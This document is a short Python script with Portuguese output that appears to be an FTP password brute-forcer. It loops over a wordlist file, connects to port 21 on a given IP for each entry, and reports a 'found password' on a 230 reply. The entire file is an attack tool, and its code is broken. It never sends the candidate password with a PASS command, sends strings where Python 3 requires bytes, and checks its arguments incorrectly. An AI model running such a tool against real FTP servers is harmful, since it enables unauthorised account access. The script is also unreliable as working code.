import socket
import re
import sys

if len(sys.argv) < 2:
    print('use python3 ftp.py 127.0.0.1 usuario')
    sys.exit(0)
ip = sys.argv[1]
usuario = sys.argv[2]

file = open('lista.txt')
for linha in file:
    print(f'Testanto com {usuario}:{linha}')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,21))
    s.recv(1024)
    s.send('User '+usuario+'\r\n')
    resulta = s.recv(1024)
    s.send('QUIT\r\n')

    if re.search('230',resulta):
    	print(f'[+] ===>>> SENHA ENCONTRADA <<<==== {linha} [+]')

    else:
    	print('[-] Acesso Negado [-]\n')